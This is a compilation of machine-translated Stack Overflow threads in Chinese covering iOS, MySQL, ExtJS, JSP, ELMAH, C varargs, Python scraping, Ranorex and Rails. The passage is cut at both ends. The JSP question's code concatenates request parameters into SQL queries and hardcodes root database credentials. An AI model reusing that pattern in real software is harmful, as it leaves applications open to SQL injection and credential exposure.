在我之前显示 UIAlertView 后，我的背景图像拒绝显示在导航栏中。我尝试创建一个单独的视图控制器并将我的 UIAlertView 移到其中，但同样的事情发生了：没有背景图像！有趣的是，如果我将初始控制器设置为经过 UIAlertView 控制器的控制器，那么背景图像会按预期出现......

感谢 Paras Joshi 在下面的回答，而不是指

```
[UINavigationBar appearance] 
```

我用了...

```
self.navigationController.navigationBar 
```

无论 UIAlertView 如何，我的背景图像都会再次出现。

这两个参考有什么区别？开始认为 iOS 7 存在我需要报告的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T16:07:14.460

在玩了一段时间后，我意识到设置背景图像会导致导航在其上创建图像图案。如果您在条形图上添加较小的图像，图像将自行重复，或者如果您放置较大的图像，您只会看到它的顶部，这就是为什么您可以看到颜色但看不到图像的原因。

此外，当您更改背景图像时，搜索栏的背景颜色将设置为黑色，这会导致半透明图像出现一些问题。因此尽量避免使用透明图像，并尝试为图像和条形使用相同的高度，最好是 44 像素。

# mysql - 在 MySQL 中按 VARCHAR 值排序

> ID：13703741
> 
> 赞同：0
> 
> 时间：2012-12-04T13:10:19.653
> 
> 标签：mysql, sql-order-by

我有一个有 2 列的表

```
id  status

1   SUBMIT
2   CANCEL
3   UPDATE
4   CANCEL
5   SUBMIT
6   UPDATE 
```

如果我做：

```
select * from table 
```

我可以使用 MySQL 按我想要的顺序排序结果吗？
ASC 将是 CANCEL、SUBMIT、UPDATE 和 DESC 反过来。如果我想要一个不同的订单，比如提交、取消、更新怎么办？可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:14:50.937

如果我理解正确，这就是你需要的：

```
SELECT * FROM `Table` ORDER BY FIELD(status, 'SUBMIT', 'CANCEL', 'UPDATE'); 
```

您可以更改列值的顺序以符合您的需求。

这是测试： [http ://sqlfiddle.com/#!2/d1885/3](http://sqlfiddle.com/#!2/d1885/3)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:12:29.267

对于您的情况::

```
Select status from table group by status 
```

会给出你需要的结果

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:18:09.657

当您搜索[mysql 自定义排序顺序](https://stackoverflow.com/search?q=[mysql]+custom+sort+order)时，您会发现很多示例。其中之一是`order by case`

```
select *
from mytable
order by case status when 'SUBMIT' then 1
                     when 'CANCEL' then 2
                     when 'UPDATE' then 3
         end 
```

[SQL小提琴](http://www.sqlfiddle.com/#!2/8a749/1/0)

# javascript - 如何使用来自 extjs 的 SSL 调用 rest

> ID：13703753
> 
> 赞同：4
> 
> 时间：2012-12-04T13:10:54.483
> 
> 标签：javascript, wcf, iis, extjs

我的配置是这样的：

*   REST 服务器：托管在 Windows 服务上的 WCF-REST。
*   Web 服务器：用于托管我的 html+js 文件的 IIS (Sencha ExtJS)。
*   客户端：客户端使用 Sencha ExtJS 编写

我在 REST 服务器上有两个身份验证/安全配置： 1\. http 根本没有身份验证。2\. 带有基本身份验证的 https (ssl)。

客户端在 no authentication/no ssl 选项上效果很好。但是，我无法使用 https/authentication 使其工作。

如果我尝试使用浏览器访问 https url，我会收到一条消息，指出服务器证书无效。我可以忽略它，然后会出现一个用户/密码弹出窗口。输入用户/密码后，我得到了 REST 响应。

我缺少什么让它使用javascript工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-04T22:43:40.727

我假设您的开发服务器正在使用自签名证书；如果是这种情况，您要求在未经用户同意的情况下进行不受信任的交易，我很确定在 Javascript 中没有办法做到这一点。

HTTPS 交易需要建立信任以确保您的数据安全。通常这是通过与第三方共享和验证的证书来完成的，但作为开发人员，我们经常在开发和测试期间使用自签名证书，因为它们快速、简单且免费。这些自签名证书需要在交易的每一端都知道，以取代已经用第三方证书建立的信任。

如果您的浏览器没有安装自签名证书的副本，您将看到您提到的典型的“哦，不，您正在访问最危险的网站”消息。浏览器为用户提供了一个 UI 来临时接受该证书（建立所需的信任），从而允许交易继续进行。Ajax 事务没有这种奢侈——浏览器只是让事务死掉，因为没有用户界面。我认为我们都应该有点庆幸在 Javascript 中没有办法打败它。

您的选择是：

1.  暂时接受一个选项卡或窗口中的交易可能会在某些浏览器上建立对其他选项卡/窗口中的交易的信任（我在 Chrome 中使用这种方法）。
2.  在浏览器中安装证书（“如何”很大程度上取决于您选择的浏览器）
3.  比您计划的要早一点获得该证书 - 无论如何您都需要它，因为您正在开发下一个 Facebook，对吗？:-)

# javascript - 在不使用提示的情况下在 javascript 中获取用户输入

> ID：13703759
> 
> 赞同：2
> 
> 时间：2012-12-04T13:11:12.797
> 
> 标签：javascript, user-input

我有一个设置，允许用户在常规 html 文本字段中键入命令。我处理文本字段上的 onkeypress 事件，检查它是否是已按下的回车键，然后解析并执行命令。

一个例子可能是：

```
deletefile /testfolder/testfile.html 
```

代码看起来像这样：

```
inputControl.onkeypress = function(e) { 
    if (e.which == 13) { 
        var outputMessage = commandHandler.executeCommand(inputControl.value);
        printOutputToScreen(outputMessage);
        inputControl.value = "";
        inputControl.focus();
    }
} 
```

（顺便说一句，这不是我的代码实际的样子，这只是一个例子）

这里的想法是能够编写命令，查看输出，编写另一个命令，查看输出等。

executeCommand 解析命令字符串并使用适当的参数调用特定命令。

```
> deletefile /test1.html
The file was deleted

> deletefile /test2.html
An error occured while trying to delete the file 
```

这部分很简单。我需要帮助的是：如果用户只是键入“deletefile”，我希望能够询问用户（使用输出区域）“您要删除哪个文件？”。

我知道我可以这样做：

```
var additionalInput = prompt("Which file?"); 
```

，但我不想使用提示。

忘记我人为的例子，有没有人知道在javascript中间询问用户输入的好方法（不使用提示），比如：

```
var status = doSomeStuff(args);  
if (status.fail) {
    tmp = getUserInput();  
    doSomeFinalStuffBasedOnTheUserInput(tmp);
} 
```

这甚至可能吗？

我不确定我能否在这里解释自己，但如果有人觉得他们可以以某种方式帮助我，请告诉我:-)

一种解决方案可能是实现一个全局状态变量，并将其用作 keypress-eventhandler 中的一种机制，以将输入路由到命令，例如：

```
inputControl.onkeypress = function(e) {
  if (e.which == 13) {
      if (state.additionalInputPending && currentCommand != null) {
          currentCommand.executeWithAdditionalInput();
      } else {
          // perform regular command execution
      }
  }
} 
```

这样，我的“应用程序”需要处理内部状态变量，并在按键之间存储 currentCommand。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:15:12.997

您可以使用 jquery/javascript 解决方案，在其中显示“花式”对话框（不是 JS 提示）来询问输入。

[http://trentrichardson.com/Impromptu/#Examples](http://trentrichardson.com/Impromptu/#Examples) 最后一个例子显示了表单。即兴只是对话/提示替代方案的许多（许多，许多）解决方案之一。

想到的唯一其他选择是直接在您正在创建的 JS 控制台中执行此操作，更像是一个真正的命令行工具。

# html - 如果没有沙盒属性，iframe 在 HTML5 中的行为如何？

> ID：13703760
> 
> 赞同：6
> 
> 时间：2012-12-04T13:11:27.180
> 
> 标签：html, iframe

当属性不存在`<iframe>`时，HTML5中的行为是什么？`sandbox`是一样的`sandbox=""`吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:21:18.763

不，它更像是相反的。

添加`sandbox`属性时，您创建了沙箱：您强制内容受到更多限制。这可以保护您的用户免受 iframe 内容的影响，如果没有该属性，情况并非如此，尤其是当内容来自同一来源时。

在`sandbox`列表中添加元素可以减少限制。这就是为什么他们被称为`"allow-something"`。

这是[W3.org 参考资料](http://www.whatwg.org/specs/web-apps/current-work/#attr-iframe-sandbox)。

这是来自 MS 的几乎清晰的介绍：[如何使用 HTML5 沙盒保护您的网站](http://msdn.microsoft.com/en-us/hh563496.aspx)

# mysql - 如何确定使用jsp选择了哪个单选按钮

> ID：13703761
> 
> 赞同：0
> 
> 时间：2012-12-04T13:11:27.907
> 
> 标签：mysql, jsp

我的应用程序中有两个单选按钮，一个是带有组合框的meterid，另一个是带有文本框的消费者名称。现在的问题是，每当我选择单选按钮时，结果才会正确，但我无法找出我选择了哪个单选按钮。

```
My application includes the following code:

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<%@page import="java.sql.*"%>
<%@ page import="java.text.SimpleDateFormat"%>
<%
Connection con;
String sqlQuery="";
Statement st;
ResultSet rs=null;
%>

<html>
<head>
<title>Meter Search
</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="styles.css" type="text/css" media="screen" />

<link rel="stylesheet" type="text/css" href="style.css" />

<style>
td{FONT: 13px Arial,sans-serif;}
th{FONT:bold 13px Arial,sans-serif;color:white;background-color:#153e7e}
input{FONT: 13px Arial,sans-serif;border: solid 1;}
select{font: 13px Arial,sans-serif}
#button{cursor:hand}
A:hover {COLOR: red}</style>

</head>

<body onload ="noback();" onpageshow="if (event.persisted) noBack();" onunload="">

<br><br>

<form action="./metersearchsuper.jsp" method="post" name="search">
<table align="left" width="40%" border="0" cellpadding="5" cellspacing="1" bgcolor="#f8f8ff" bordercolor="#333366" >
  <tbody><tr>
    <th colspan="6"  width ="40%" >Search options</th></tr>

<tr><td  width="15%" class="options0" id="tdSearchBy" colspan="5">

<input name="r1" value="MeterID" onclick="searchOptions(0)" type="radio"><font size="4">Meter ID</font></td>

<%
    Class.forName("com.mysql.jdbc.Driver");
    con = DriverManager.getConnection("jdbc:mysql://localhost:3306/suwatermeter","root","sumith");
    sqlQuery="select distinct Meterid from Meter_List";
    st=con.createStatement();

     rs=st.executeQuery(sqlQuery);
%>

<td  width="20%" class="options0" colspan="5"><select style="WIDTH: 150px" selected="true" name="meterid" id="meter_id" onChange="this.form.submit()">
<option>Select Meter ID</option>
<% while(rs.next()) {%>
<option value="<%=rs.getInt("MeterID")%>"><%=rs.getInt("MeterID")%></option>

<% } 

rs.close();
st.close();
con.close();
%>

</select>

</td></tr>

<tr><td class="options1" id="tdSearchBy" colspan="5">

<input name="r1" value="ConsumerName"  onclick="searchOptions(1)" type="radio"><font size="3">Consumer Name</font>
</td>
<td><input name="cnsearch" style="WIDTH: 150px"></td>
</tr>
</tbody>
</table>
<table>
<tbody> 
<tr><td style="height: 50px; border: 1px solid rgb(255, 255, 255);" colspan="4" align="center">

<input name="bSearch" value="Search" style="width: 80px; HEIGHT: 34px; border: 1px solid rgb(13, 31, 78);" onclick="return checkInput()" type="submit">

</td></tr>

  </tbody></table>

<%

try{

    String meterid =request.getParameter("meterid");

    String cnsearch=request.getParameter("cnsearch");
    String r1=request.getParameter("r1");
    String flag="";
    int mid;

    String ConsumerName;

    int SNo=1;

    Class.forName("com.mysql.jdbc.Driver");
    con = DriverManager.getConnection("jdbc:mysql://localhost:3306/suwatermeter","root","sumith");
    st=con.createStatement();
   %>
    <input type="hidden" id="Hmeter_id" value="<%=meterid%>">

<%

if(r1.equals("MeterID"))
{
    rs=st.executeQuery("select * from Meter_List where Meterid="+meterid);
    flag="false";
}

if(r1.equals("ConsumerName"))
{
    rs=st.executeQuery("select * from Meter_List where Consumername='"+cnsearch+"'");
    flag="false";
}
if(flag.equals("false"))
{%><br><br><br>

 <table width="100%" height="20%">

 <tr><td>&nbsp;</td></tr><tr><td>&nbsp;</td></tr>

<%
boolean mycolor=true;
int tHeading=0;  //0 means false

if(meterid != null && cnsearch != null )

    tHeading=0;

//else if(getZoneName !=null || !getZoneName.equals("") || !getZoneName.isEmpty())

  // { 
    //tHeading=1;
  // }

while(rs.next()){
String checkdate="";
SimpleDateFormat df=new SimpleDateFormat("dd-MM-yy");
checkdate=df.format(rs.getDate("Date"));

if(tHeading==0)
    {%>
        <table  border="0" style="" width="100%" align="center" cellpadding="5" cellspacing="0">
        <tbody>
        <th>S No</th>
        <th>Meter ID</th>
        <th>Consumer ID</th>
        <th>Consumer Name</th>
        <th>Reading</th>
        <th>Date</th>
        <th>Time</th>
        <th>Status</th>
        <th>Sub Zone</th>
        <th>Zone</th>
                <%tHeading=1;

      }

 if(mycolor==true)
 {%>
        <tr>
    <td align="center" bgcolor="#ffffff"><%=SNo%></td>
    <td align="center" bgcolor="#ffffff"><a href="meteridinfosuper.jsp?mid=<%=rs.getInt("meterid")%>
&Consumerid=<%=rs.getInt("Consumerid")%>&Consumername=<%=rs.getString("Consumername")%>&Subzone=<%=rs.getString("Subzone")%>&Zone=<%=rs.getString("Zone")%>">
    <%=rs.getInt("Meterid")%></a></td>
    <td align="center" bgcolor="#ffffff"><%=rs.getInt("Consumerid")%></td>
    <td  align="center" bgcolor="#ffffff"><%=rs.getString("Consumername")%></td>
    <td  align="center" bgcolor="#ffffff"><%=rs.getInt("LastReading")%></td>
    <td align="center" bgcolor="#ffffff"><%=checkdate%></td>
    <td align="center" bgcolor="#ffffff"><%=rs.getTime("Time")%></td>
    <td align="center" bgcolor="#ffffff"><%=rs.getString("Status")%></td>
    <td align="center" bgcolor="#ffffff"><%=rs.getString("Subzone")%></td>
    <td align="center" bgcolor="#ffffff"><%=rs.getString("zone")%></td>
        </tr><%
        mycolor=false;
}
else
{%>   <!--ceefff-->
    <tr>
    <td align="center" bgcolor="#ceefff"><%=SNo%></td>
    <td align="center" bgcolor="#ceefff"><a href="meteridinfosuper.jsp?mid=<%=rs.getInt("meterid")%>
&Consumerid=<%=rs.getInt("Consumerid")%>&Consumername=<%=rs.getString("Consumername")%>&Subzone=<%=rs.getString("Subzone")%>&Zone=<%=rs.getString("Zone")%>">
    <%=rs.getInt("Meterid")%></a></td>
    <td align="center" bgcolor="#ceefff"><%=rs.getInt("Consumerid")%></td>
    <td  align="center" bgcolor="#ceefff"><%=rs.getString("Consumername")%></td>
    <td  align="center" bgcolor="#ceefff"><%=rs.getInt("LastReading")%></td>
    <td align="center" bgcolor="#ceefff"><%=checkdate%></td>
    <td align="center" bgcolor="#ceefff"><%=rs.getTime("Time")%></td>
    <td align="center" bgcolor="#ceefff"><%=rs.getString("Status")%></td>
    <td align="center" bgcolor="#ceefff"><%=rs.getString("Subzone")%></td>
    <td align="center" bgcolor="#ceefff"><%=rs.getString("zone")%></td>
        </tr><%     
        mycolor=true;
}

SNo++;
}

}
rs.close();
st.close();
con.close();
} 

catch(Exception e){}

%>
<script>

    document.getElementById("meter_id").value=document.getElementById("Hmeter_id").value;
</script>

</table>

</body>
</html> 
```

请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:41:28.747

通常你只需要读取其中的`r1`值`metersearchsuper.jsp`将是`MeterID`或`ConsumerName`作为结果。

```
String selected = request.getAttribute("r1"); 
```

# asp.net - 如何使用 Windows Integrated Security 在 ASP.Net MVC 4 上保护 Elmah：Elmah 忽略我的设置

> ID：13703763
> 
> 赞同：16
> 
> 时间：2012-12-04T13:11:35.400
> 
> 标签：asp.net, .net, asp.net-mvc, security, elmah

我已将 elmah 添加到 asp.net mvc 4 应用程序中。日志记录正在工作，现在我正在尝试配置安全性，但 elmah 没有获取设置，并且所有用户都可以看到日志。

这是一个 Intranet 应用程序，因此我们正在使用 Windows 集成安全。我正在尝试限制访问，以便只有 domain\log_readers 广告组的成员才能阅读日志。

我在这里阅读了设置指南：[http](http://code.google.com/p/elmah/wiki/SecuringErrorLogPages) ://code.google.com/p/elmah/wiki/SecuringErrorLogPages我还阅读了一些关于 SO 和其他表单的帖子，这些帖子让我添加了 roleManager 和 WindowsRoleProvider 配置，一切都无济于事。

这是我的 web.config 的 elmah 部分：

```
<elmah>
<!--
    See http://code.google.com/p/elmah/wiki/SecuringErrorLogPages for 
    more information on remote access and securing ELMAH.
-->
<security allowRemoteAccess="true" />
<errorLog type="Elmah.XmlFileErrorLog, Elmah" logPath="~/Logs" />  
</elmah>
<location path="elmah.axd" inheritInChildApplications="false">
<system.web>
  <authentication mode="Windows" />

  <roleManager defaultProvider="WindowsProvider"
      enabled="true" cacheRolesInCookie="false">
    <providers>
      <add
        name="WindowsProvider"
        type="System.Web.Security.WindowsTokenRoleProvider" />
    </providers>
  </roleManager>
  <httpHandlers>
    <add verb="POST,GET,HEAD" path="elmah.axd" type="Elmah.ErrorLogPageFactory, Elmah" />
  </httpHandlers>
  <!-- 
    See http://code.google.com/p/elmah/wiki/SecuringErrorLogPages for 
    more information on using ASP.NET authorization securing ELMAH.
  -->
  <authorization>
    <allow roles="domain\log_readers"/>
    <deny users="*" />
  </authorization>

</system.web>
<system.webServer>
  <handlers>
    <add name="ELMAH" verb="POST,GET,HEAD" path="elmah.axd" type="Elmah.ErrorLogPageFactory, Elmah" preCondition="integratedMode" />
  </handlers>
</system.webServer>
</location> 
```

我还尝试通过将我的自动化配置设置为拒绝所有人来完全锁定

```
<authorization>
<deny users="*" />
</authorization> 
```

并且

```
<authorization>
<deny users="?" />
</authorization> 
```

日志仍然对所有人开放。

我怀疑问题可能出在位置上。我没有更改 elmah 的位置。它是从默认位置（[http://server/myapp/elmah](http://server/myapp/elmah)）访问的

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-12-06T14:17:15.730

如果您使用 Elmah.Mvc，它们具有非常精细的安全设置。例如，您可以轻松地将 elmah 页面保护为仅对 Admin 组中的登录用户可用。

Elmah.Mvc 支持以下项目`<appSettings>`

```
<appSettings>
    <!-- ELMAH configuration. Admin page only available for logged in users in 
         the Admin role. -->
    <add key="elmah.mvc.disableHandler" value="false" />
    <add key="elmah.mvc.disableHandleErrorFilter" value="false" />
    <add key="elmah.mvc.requiresAuthentication" value="true" />
    <add key="elmah.mvc.allowedRoles" value="Admin" />
    <add key="elmah.mvc.route" value="elmah" />
</appSettings> 
```

感兴趣的键是`elmah.mvc.requiresAuthentication`打开需要登录的用户的开关。以及`elmah.mvc.allowedRoles`指定用户必须处于哪个角色。

您可以从 nuget 安装 Elmah.Mvc。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-08-02T16:12:20.367

一旦我发现如何在使用 Windows 身份验证时确定角色，上述答案效果很好：

打开命令窗口并输入以下命令：

```
cmd /k net user <user> /Domain 
```

对于`<user>`，请替换您的用户名。该命令将列出您所属的组。

说明来自[http://msdn.microsoft.com/en-us/library/gg703322(VS.98).aspx上的“如何使用 ASP.NET MVC 创建 Intranet 站点”](http://msdn.microsoft.com/en-us/library/gg703322(VS.98).aspx)

# c - 如何填写 va_list

> ID：13703770
> 
> 赞同：20
> 
> 时间：2012-12-04T13:11:50.313
> 
> 标签：c, variadic-functions

如果我有一个 va_list 我知道如何提取它的所有元素：

```
void printInts(int n,...)
{
    va_list va;
    va_start(va, n);
    for(unsigned int i=0; i<n; i++)
    {
        int arg=va_arg(va, int);
        printf("%d",arg);
    }
    va_end(va);
} 
```

因此，当我调用 printInts(3,1,2,3) 时，va_list 会填充所有参数。
但是如何在不使用 va_start 的情况下手动填充 va_list？我的意思是我想要类似的东西：

```
va_list va;
push_arg(va, int, 5); // And so on until I fill all parameters
... 
```

我需要这个，因为有一个函数接受 va_list 作为参数，我不知道如何填充所有参数的 va_list。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-04T13:19:53.940

无法显式填充 va_list。

您应该编写一个包装函数。假设您需要调用函数 foo，而不是手动填写 va_list，而是定义一个新函数，如下所示：

```
void call_foo(int arg1, ...)
{
   va_list ap;
   va_start(ap, arg1);
   foo(arg1, ap);
   va_end(ap);
} 
```

现在你可以调用`foo`，它需要一个 va_list，但是你喜欢，例如 call_foo(1,2,3,4);, call_foo(1, 1, "Hello"); 等等

这将只允许您在编译时指定参数，您不能在运行时构建参数。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-12-04T13:16:27.850

通常，这些功能成对出现。如果你有一个“va-accepting”功能，很容易创建另一个：

```
void printInts_v(int n, va_list ap)
{
    unsigned int i=0;
    for(i=0; i<n; i++)
    {
        int arg=va_arg(ap, int);
        printf("%d", arg);
    }
} 
```

这个函数可以这样调用：

```
void printInts(int n,...)
{
    va_list ap;
    va_start(ap, n);
    printInts_v(n, ap);
    va_end(va);
} 
```

但我不认为有一种方法可以便携式预填充以`va_list`供以后使用。

但是，如果您使用一种架构并且可移植性不是问题，那么您可以自己制作一些东西。具体如何做到这一点是特定于平台的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:14:47.603

我认为没有标准化的方法可以做到这一点。另一方面，这样的预填充`va_list`将毫无用处，因为也无法“查询”它以获取可用参数的数量和类型。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-07T11:55:59.527

由于其他回复表明这是不可能的（这将是在下一个版本的语言设计中添加它的一个很好的理由），唯一可移植的可能性是

*   检查文档两次以调查您是否没有错过或误解有关您尝试使用的框架的某些内容：我在[这里](https://stackoverflow.com/questions/55987022/when-extending-python-with-c-how-do-one-dynamically-build-a-complex-structure-i)遇到了完全相同的问题，它出现在我没有使用正确的调用的答案中正在尝试做；

*   为自己编写一个函数，该函数将指针数组作为参数而不是 va_list 并将问题拆分为多个调用（并非总是可能）；或者

*   假设您尝试使用的框架设计不佳...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-10-24T18:13:14.987

将函数拆分为多个调用适用于*printf*系列 - 在 Kernighan & Ritchie 中有这样的代码，大致如下：

```
void printf_OclFile(struct OclFile* self, char* f, void* sq[])
{ int n = length(sq);
  if (n == 0 || self->actualFile == NULL) 
  { return; }

  void* ap; 
  char* p = f; 
  int i = 0; 

  char* sval; 
  int ival; 
  double dval; 

  ap = sq[0]; 
  for ( ; *p != '\0' && i < n; p++)
  { if (*p != '%')
    { char* p0 = subString(p,1,1); 
      fputs(p0, self->actualFile); 
      continue; 
    } 

    p++; /* Points to flag after % */ 

    switch (*p)
    { case 'd' : 
        ival = *((int*) sq[i]); 
        i++; 
        fprintf(self->actualFile, "%d", ival);
        break; 
      case 'f' : 
        dval = *((double*) sq[i]); 
        i++; 
        fprintf(self->actualFile, "%f", dval); 
        break; 
      case 's' : 
        sval = ((char*) sq[i]); 
        i++; 
        fprintf(self->actualFile, "%s", sval); 
        break;
      default : 
        char* p0 = subString(p,1,1); 
        fputs(p0, self->actualFile);
        break; 
    }
  } 
} 
```

# python - 将表单数据发送到 aspx 页面

> ID：13703772
> 
> 赞同：6
> 
> 时间：2012-12-04T13:12:08.290
> 
> 标签：python, screen-scraping, urllib2

需要在网站上进行搜索

```
 url = r'http://www.cpso.on.ca/docsearch/' 
```

这是一个 aspx 页面（我从昨天开始这个跋涉，对不起菜鸟问题）

使用 BeautifulSoup，我可以像这样得到 __VIEWSTATE 和 __EVENTVALIDATION：

```
 viewstate = soup.find('input', {'id' : '__VIEWSTATE'})['value']
    eventval = soup.find('input', {'id' : '__EVENTVALIDATION'})['value'] 
```

并且标题可以这样设置：

```
 headers = {'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13',
'HTTP_ACCEPT': 'text/html,application/xhtml+xml,application/xml; q=0.9,*/*; q=0.8',
'Content-Type': 'application/x-www-form-urlencoded'} 
```

如果你去网页，我真正想要传递的唯一值是名字和姓氏......

```
 LN = "smith"
    FN = "a"
    data = {"__VIEWSTATE":viewstate,"__EVENTVALIDATION":ev,
    "ctl00$ContentPlaceHolder1$MainContentControl1$ctl00$txtLastName":LN, 
    "ctl00$ContentPlaceHolder1$MainContentControl1$ctl00$txtFirstName":FN} 
```

所以把它们放在一起就像这样：

```
 import urllib
    import urllib2
    import urlparse
    import BeautifulSoup

    url = r'http://www.cpso.on.ca/docsearch/'
    html = urllib2.urlopen(url).read()
    soup = BeautifulSoup.BeautifulSoup(html)

    viewstate = soup.find('input', {'id' : '__VIEWSTATE'})['value']
    ev = soup.find('input', {'id' : '__EVENTVALIDATION'})['value']
    headers = {'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13',
        'HTTP_ACCEPT': 'text/html,application/xhtml+xml,application/xml; q=0.9,*/*; q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded'}

    LN = "smith"
    FN = "a"
    data = {"__VIEWSTATE":viewstate,"__EVENTVALIDATION":ev,
            "ctl00$ContentPlaceHolder1$MainContentControl1$ctl00$txtLastName":LN, 
            "ctl00$ContentPlaceHolder1$MainContentControl1$ctl00$txtFirstName":FN}

    data = urllib.urlencode(data)
    request = urllib2.Request(url,data,headers)
    response = urllib2.urlopen(request)
    newsoup = BeautifulSoup.BeautifulSoup(response)
    for i in newsoup:
        print i 
```

问题是它似乎并没有真正给我结果......不知道我是否需要为表单中的每个文本框提供每个值或什么......也许我只是做得不正确。无论如何，只是希望有人可以让我直截了当。我以为我有，但我希望看到医生名单和联系信息。

非常感谢任何见解，我以前使用过 beautifulsoup，但我认为我的问题只是发送请求并在数据部分中包含适量的信息。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-05T03:42:19.417

听取了@pguardiario 的建议，走上了机械化路线……简单多了

```
 import mechanize

    url = r'http://www.cpso.on.ca/docsearch/'
    request = mechanize.Request(url)
    response = mechanize.urlopen(request)
    forms = mechanize.ParseResponse(response, backwards_compat=False)
    response.close()

    form = forms[0]

    form['ctl00$ContentPlaceHolder1$MainContentControl1$ctl00$txtLastName']='Smith'
    form['ctl00$ContentPlaceHolder1$MainContentControl1$ctl00$txtPostalCode']='K1H'

    print mechanize.urlopen(form.click()).read() 
```

我距离完成还有很长的路要走，但这让我更进一步。

# login - 使用 Ranorex 工具进行自动化测试时发生错误。请建议我如何在自动化中解决这些类型的案例

> ID：13703773
> 
> 赞同：0
> 
> 时间：2012-12-04T13:12:06.667
> 
> 标签：login, automated-tests, functional-testing

这次我使用**Ranorex 工具**记录了一个用于登录功能的测试脚本。这次登录完成，然后单击菜单栏时，错误显示为**“No element found for path 'dom[4]/.//span[#'aui_3_4_0_1_637']' within 1m. Failed to find item' sekar1Repository.WelcomeSaarccasesCom.Aui3401637'"**。

实际上，我已经使用**Ranorex 工具**脚本记录了登录功能。在我录制的脚本中，我对“登录”执行了“单击”操作，然后输入用户名和密码，然后打开主页，其中包含多个任务的菜单栏。在那我点击第一个功能，然后继续进一步的步骤，然后我播放整个脚本。这次登录成功，但在单击选项卡菜单时，错误消息**在 1m 内抛出“找不到路径 'dom[4]/.//span[#'aui_3_4_0_1_637'] 的元素”。未能找到项目 'sekar1Repository .WelcomeSaarccasesCom.Aui3401637'”**，案件以失败告终。

请建议我如何解决这些类型的案例。因为每次我运行该录制的脚本时，它都会显示相同的错误消息并停止该脚本。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T22:43:12.880

当您记录测试用例时，它可能会发生（使用所有工具）。我认为 html span 得到了网站生成的 id，每次都在变化。我鼓励您使用 CSS 类或其他信息来获取跨度。

类似于：dom[4]/.//span[@name=login]

法布里斯

# ruby-on-rails - 由于活动记录，无法启动 Rails 服务器以连接到 postgres：连接未建立

> ID：13703776
> 
> 赞同：2
> 
> 时间：2012-12-04T13:12:19.600
> 
> 标签：ruby-on-rails, ruby, postgresql, activerecord

```
I have installed ruby 1.9.3-p327, and my databse is postgres.I modified the database.yml page also..as:evelopment: 
```

适配器：postgresql 数据库：db_pchamar 用户名：db_test_user 密码：密码主机：192.168.1.101 池：5

测试：适配器：postgresql 数据库：db_pchamara.test 用户名：db_test_user 密码：密码主机：192.168.1.101 池：5

生产：适配器：postgresql 数据库：db_pchamara 用户名：db_test_user 密码：密码主机：192.168.1.101 池：5 .但是我遇到的问题是，当我运行`rails server`它时显示以下错误：它没有连接到 postgre db..

**但是如果运行 ruby​​ 文件，它会从 db 获取数据：帮我解决这个问题，.....**

```
ActiveRecord::ConnectionNotEstablished (ActiveRecord::ConnectionNotEstablished):
  activerecord (3.2.9) lib/active_record/connection_adapters/abstract/connection_pool.rb:410:in `retrieve_connection'
  activerecord (3.2.9) lib/active_record/connection_adapters/abstract/connection_specification.rb:171:in `retrieve_connection'
  activerecord (3.2.9) lib/active_record/connection_adapters/abstract/connection_specification.rb:145:in `connection'
  activerecord (3.2.9) lib/active_record/query_cache.rb:67:in `rescue in call'
  activerecord (3.2.9) lib/active_record/query_cache.rb:61:in `call'
  activerecord (3.2.9) lib/active_record/connection_adapters/abstract/connection_pool.rb:479:in `call'
  actionpack (3.2.9) lib/action_dispatch/middleware/callbacks.rb:28:in `block in call'
  activesupport (3.2.9) lib/active_support/callbacks.rb:405:in `_run__241814793__call__597619238__callbacks'
  activesupport (3.2.9) lib/active_support/callbacks.rb:405:in `__run_callback'
  activesupport (3.2.9) lib/active_support/callbacks.rb:385:in `_run_call_callbacks'
  activesupport (3.2.9) lib/active_support/callbacks.rb:81:in `run_callbacks'
  actionpack (3.2.9) lib/action_dispatch/middleware/callbacks.rb:27:in `call'
  actionpack (3.2.9) lib/action_dispatch/middleware/reloader.rb:65:in `call'
  actionpack (3.2.9) lib/action_dispatch/middleware/remote_ip.rb:31:in `call'
  actionpack (3.2.9) lib/action_dispatch/middleware/debug_exceptions.rb:16:in `call'
  actionpack (3.2.9) lib/action_dispatch/middleware/show_exceptions.rb:56:in `call'
  railties (3.2.9) lib/rails/rack/logger.rb:32:in `call_app'
  railties (3.2.9) lib/rails/rack/logger.rb:16:in `block in call'
  activesupport (3.2.9) lib/active_support/tagged_logging.rb:22:in `tagged'
  railties (3.2.9) lib/rails/rack/logger.rb:16:in `call'
  actionpack (3.2.9) lib/action_dispatch/middleware/request_id.rb:22:in `call'
  rack (1.4.1) lib/rack/methodoverride.rb:21:in `call'
  rack (1.4.1) lib/rack/runtime.rb:17:in `call'
  activesupport (3.2.9) lib/active_support/cache/strategy/local_cache.rb:72:in `call'
  rack (1.4.1) lib/rack/lock.rb:15:in `call'
  actionpack (3.2.9) lib/action_dispatch/middleware/static.rb:62:in `call'
  railties (3.2.9) lib/rails/engine.rb:479:in `call'
